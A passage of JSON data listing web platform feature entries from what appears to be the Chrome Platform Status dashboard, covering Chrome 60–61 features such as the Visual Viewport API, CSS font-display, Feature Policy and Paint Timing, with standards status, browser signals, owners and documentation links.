        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1357785",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "bokan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 61,
        "blink_components": [
          "Blink>Scroll"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "http://crbug.com/595826",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "url": "https://discourse.wicg.io/t/explicit-api-for-visual-viewport/1399",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=170982",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Exposes information about the visual viewport to the page.",
    "id": 5737866978131968,
    "resources": {
      "docs": [
        "https://wicg.github.io/visual-viewport/",
        "https://developer.mozilla.org/en-US/docs/Web/API/Visual_Viewport_API",
        "https://developer.mozilla.org/en-US/docs/Web/API/VisualViewport"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-16 02:39:33.845920",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "Android Payment Apps",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://docs.google.com/document/d/1izV4uC-tiRJG3JLooqY3YRLU22tYOsLTNq0P_InPJeE",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "rouslan@chromium.org",
          "zkoch@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Payments"
        ],
        "flag": false,
        "android": 60,
        "bug": "http://crbug.com/684655",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Web payments is a W3C standard API for e-commerce websites to collect payment information from users with user consent. This feature lets users pay using native Android payment apps.",
    "id": 5730366077796352,
    "resources": {
      "samples": [
        "https://rsolomakhin.github.io/pr/bob/",
        "https://rsolomakhin.github.io/pr/alipay/"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2018-02-06 16:14:26.444160",
      "by": "jmedley@google.com"
    },
    "name": "Budget API",
    "tags": [
      "silent push",
      "background",
      "budget",
      "job scheduler"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://beverloo.github.io/budget-api/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Origin trial",
          "val": 8,
          "milestone_str": 60
        },
        "owners": [
          "harkness@chromium.org"
        ],
        "prefixed": false,
        "origintrial": true,
        "blink_components": [
          "Blink>PushAPI"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=617971",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This specification describes an API that can be used to retrieve the amount of budget an origin has available for resource consuming background operations, as well as the cost associated with doing such an operation. ",
    "id": 5691190548627456,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Web_Budget_API",
        "https://developer.mozilla.org/en-US/docs/Web/API/BudgetService",
        "https://developer.mozilla.org/en-US/docs/Web/API/BudgetState"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-12-04 10:03:03.712870",
      "by": "myakura.web@gmail.com"
    },
    "name": "CSS font-display",
    "tags": [
      "font-rendering",
      "fout",
      "foit",
      "webfont"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://drafts.csswg.org/css-fonts-4/#font-display-desc",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/58",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "kenjibaheux@chromium.org",
          "ksakamoto@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=530015",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/#specification-css-font-display",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "A new @font-face descriptor and a corresponding property for controlling how a downloadable font renders before it is fully loaded.",
    "id": 4799947908055040,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/docs/Web/CSS/@font-face/font-display"
      ],
      "samples": [
        "http://output.jsbin.com/nigahi/latest/quiet"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-11-08 17:42:02.006770",
      "by": "kojii@chromium.org"
    },
    "name": "CSS line-height-step property",
    "tags": [
      "vertical rhythm",
      "east asia"
    ],
    "comments": "This spec was originally called \"snap-height\", then renamed to \"snap size\", and to \"step sizing\". Renamed to \"CSS Rhythmic Sizing\" in Jan 2017.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://drafts.csswg.org/css-rhythm/#line-height-step",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1343819",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 60
        },
        "owners": [
          "kojii@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>Layout"
        ],
        "desktop": 60,
        "flag": true,
        "android": 60,
        "bug": "http://crbug.com/586413",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "http://wkb.ug/167333",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The CSS line-height-step property provides an ability to round the heights of line boxes to the multiple of the specified length. This property allows authors to control vertical rhythm.",
    "id": 5734273533345792,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/line-height-step"
      ],
      "samples": [
        "https://drafts.csswg.org/css-rhythm/examples/snap-height.html"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-12-05 17:44:31.298950",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS4 :focus-within pseudo-class",
    "tags": [
      "css-selectors",
      "selectors-4",
      "focus-within"
    ],
    "comments": "Information about Chromium implementation: https://blogs.igalia.com/mrego/2017/05/03/adding-focus-within-selector-to-chromium/",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/selectors-4/#the-focus-within-pseudo",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/52",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "rego@igalia.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 60,
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=617371",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "url": "https://wpdev.uservoice.com/forums/257854-microsoft-edge-developer/suggestions/11725071-implement-focus-within-from-selectors-4",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://developer.apple.com/safari/technology-preview/release-notes/#r8",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The :focus-within pseudo-class applies to elements for which the :focus pseudo class applies.\r\n\r\nAn element also matches :focus-within if one of its descendants in the flat tree (including non-element nodes, such as text nodes) matches the conditions for matching :focus.",
    "id": 5363834508279808,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/:focus-within"
      ],
      "samples": [
        "http://codepen.io/anon/pen/xOLJym",
        "https://blogs.igalia.com/mrego/files/2017/05/focus-within-demo.html",
        "https://blogs.igalia.com/mrego/files/2017/05/focus-within-menu.html"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:59.671050",
      "by": "ericbidelman@google.com"
    },
    "name": "Card issuer networks as payment method names",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/webpayments-methods-card/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": 60
        },
        "owners": [
          "rouslan@chromium.org",
          "zkoch@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Payments"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "http://crbug.com/719526",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Support for calling PaymentRequest with card issuer networks (e.g., \"visa\", \"amex\", \"mastercard\") in the supportedMethods field.",
    "id": 5725727580225536,
    "resources": {}
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-28 21:20:32.208810",
      "by": "ericbidelman@google.com"
    },
    "name": "Client.type",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/ServiceWorker/#client-type",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "leon.han@intel.com",
          "shimazu@chromium.org",
          "foolip@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "https://crbug.com/705685",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The type read-only property of the Client interface indicates the type of client the service worker is controlling.",
    "id": 5023199309856768,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Client/type"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-02-06 16:09:58.243370",
      "by": "jmedley@google.com"
    },
    "name": "Constructor for DataTransfer",
    "tags": [
      "datatransfer constructor clipboard"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://html.spec.whatwg.org/multipage/interaction.html#the-datatransfer-interface",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "garykac@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>DataTransfer"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=677564",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The new asynchronous clipboard API makes use of DataTransfer objects and has a need to be able to construct new ones. For example (with new clipboard api):\r\n\r\nvar data = new DataTransfer();\r\ndata.items.add(\"\\(°o°)/\", \"text/plain\");\r\nnavigator.clipboard.write(data).then(function() {\r\n  console.log(“Copied to clipboard successfully! ᕕ( ᐛ )ᕗ”);\r\n}, function() {\r\n  console.error(“Unable to write to clipboard. (╯ಠ_ಠ)╯︵ ┻━┻”);\r\n});\r\n",
    "id": 5146128253190144,
    "resources": {
      "docs": [
        "Spec change: https://github.com/whatwg/html/commit/688a102b52c7050a6808a05c5d8fe149c0937fd7",
        "Tests: http://w3c-test.org/html/editing/dnd/datastore/datatransfer-constructor-001.html",
        "https://developer.mozilla.org/en-US/docs/Web/API/DataTransfer",
        "https://developer.mozilla.org/en-US/docs/Web/API/DataTransfer/DataTransfer"
      ],
      "samples": [
        "https://w3c.github.io/clipboard-apis/#h-clipboard-write-data"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-03-30 16:36:11.639330",
      "by": "jmedley@google.com"
    },
    "name": "Credential Management API - CredentialsContainer.create",
    "tags": [
      "Credential Management API",
      "CredentialsContainer",
      "CredentialCreationOptions"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/webappsec-credential-management/#dom-credentialscontainer-create",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "jdoerrie@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>SecurityFeature>CredentialManagement"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "http://crbug.com/722242",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This feature introduces the CredentialsContainer.create method to the Credential Management API. This method allows for asynchronous creation of Credential objects.",
    "id": 5451971465052160,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/CredentialsContainer",
        "https://developer.mozilla.org/en-US/docs/Web/API/CredentialsContainer/create"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-12-14 17:25:58.390750",
      "by": "jmedley@google.com"
    },
    "name": "Document constructor",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://dom.spec.whatwg.org/#dom-document-document",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>DOM"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "http://crbug.com/238234",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Support new Document() to create a Document instance.\r\n",
    "id": 6078850731606016,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Document",
        "https://developer.mozilla.org/en-US/docs/Web/API/Document/Document"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-01-10 19:59:19.661160",
      "by": "ericbidelman@google.com"
    },
    "name": "Drop SiteBoundCredential concept in favor of a CredentialUserData mixin in CM API",
    "tags": [
      "Credential Manager API",
      "SiteBoundCredential",
      "CredentialUserData"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/webappsec-credential-management/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "jdoerrie@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>SecurityFeature>CredentialManagement"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "http://crbug.com/714615",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This change drops the SiteBoundCredential interface in\r\nfavor of a CredentialUserData mixin. This change was introduced in the\r\nCredential Manager API specification with commit\r\na43865bd8aa9842dbc8d8e688d5668c087677eac\r\n(https://github.com/w3c/webappsec-credential-management/commit/a43865bd8aa9842dbc8d8e688d5668c087677eac).",
    "id": 5737077098414080,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Credential_Management_API"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-03-30 16:37:15.671410",
      "by": "jmedley@google.com"
    },
    "name": "Expose passwords to JavaScript in Credential Management API",
    "tags": [
      "Credential Management API",
      "PasswordCredential"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/webappsec-credential-management/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/webappsec-credential-management/pull/76",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "jdoerrie@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>SecurityFeature>CredentialManagement"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "http://crbug.com/718416",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This change exposes passwords to JavaScript in the Credential Management API by providing the corresponding attribute on PasswordCredential. Furthermore it deprecates the previously existing PasswordCredential attributes and the custom `fetch()` `credential` infrastructure.",
    "id": 5689327799500800,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2017/06/credential-management-updates",
        "https://developer.mozilla.org/en-US/docs/Web/API/PasswordCredential",
        "https://developer.mozilla.org/en-US/docs/Web/API/PasswordCredential/password"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-04-16 17:08:49.676260",
      "by": "iclelland@chromium.org"
    },
    "name": "Feature Policy",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://wicg.github.io/feature-policy/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://mozilla.github.io/standards-positions/",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "ojan@chromium.org",
          "raymes@chromium.org",
          "iclelland@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>FeaturePolicy"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "https://crbug.com/623682",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "url": "https://github.com/WICG/feature-policy/issues/62",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allow site authors to selectively enable and disable use of various browser features and APIs.",
    "id": 5694225681219584,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1k0Ua-ZWlM_PsFCFdLMa8kaVTo32PeNZ4G7FFHqpFx4E/edit?usp=sharing"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-09-20 18:19:31.458170",
      "by": "Patket@microsoft.com"
    },
    "name": "Fetch API: Request/Response.formData",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://fetch.spec.whatwg.org/#dom-body-formdata",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1109751",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "eero.hakkinen@intel.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>Network>FetchAPI"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=718393",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Allows multipart/form-data and application/x-www-form-urlencoded fetch requests and responses to be consumed and parsed into FormData objects.",
    "id": 5687725978025984,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Body",
        "https://developer.mozilla.org/en-US/docs/Web/API/Body/formData"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-11-27 20:01:47.147190",
      "by": "ericbidelman@google.com"
    },
    "name": "First Paint Timing API",
    "comments": "`performance.getEntriesByType('paint').forEach(entry => console.log(entry.name, entry.startTime))`",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/paint-timing/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "panicker@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>PerformanceAPIs"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=720055",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "url": "https://github.com/w3c/charter-webperf/issues/32",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/w3c/charter-webperf/issues/32",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "API to enable developers to measure time for First Paint (FP) & First Contentful Paint (FCP) -- the first key moments in loading that they care about. These moments are added as 'paint' entries in the Performance Timing API.",
    "id": 5688621814251520,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/PerformancePaintTiming",
        "https://developers.google.com/web/updates/2017/07/nic60#paint"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-08-31 18:41:16.674620",
      "by": "jmedley@google.com"
    },
    "name": "InputEvent",
    "tags": [
      "InputEvent",
      "beforeinput",
      "input"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://www.w3.org/TR/2017/WD-input-events-1-20170321/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=970802",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "chongz@chromium.org",
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "https://crbug.com/585875",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "url": "https://lists.w3.org/Archives/Public/public-editing-tf/2016Jan/0034.html",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/blog/7358/enhanced-editing-with-input-events/",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "InputEvent allows user input to be managed by script and help interactive with IME.",
    "id": 5656380006465536,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/InputEvent"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-11-24 10:01:16.009550",
      "by": "fbeaufort@google.com"
    },
    "name": "New VP9 codec string and Profile 2 support",
    "tags": [
      "VP9",
      "Media",
      "Video"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "hbengali@chromium.org",
          "chcunningham@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=672240",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "VP9 is an open and royalty-free video codec that has been supported in Chromium since 2013. This update adds a new string format for describing the encoding properties, such as the profile, level, etc. Such properties are common in video codecs but are not exposed in the current VP9 string format. In addition, this update includes using the new format to advertise support for VP9 Profile 2. The string format is accepted by media-related APIs",
    "id": 6230726177456128,
    "resources": {
      "docs": [
        "https://www.webmproject.org/vp9/mp4/"
      ],
      "samples": [
